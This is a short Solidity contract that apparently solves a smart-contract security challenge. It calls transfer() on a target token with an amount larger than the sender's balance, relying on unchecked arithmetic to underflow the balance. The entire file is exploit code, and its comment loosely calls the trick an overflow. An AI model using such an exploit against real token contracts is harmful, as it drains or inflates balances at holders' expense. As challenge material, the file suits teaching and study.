pragma solidity ^0.8.0;

import './IToken.sol';

contract TokenAttacker {
    IToken private immutable _tokenInstance;

    constructor(
        IToken tokenInstance
    ) {
        _tokenInstance = tokenInstance;
    }

    function transferTokensToReceiver(address receiver) public {
        // Overflowing token contract (always positive, since value is unsigned int)
        _tokenInstance.transfer(receiver, 1000000000);
    }
}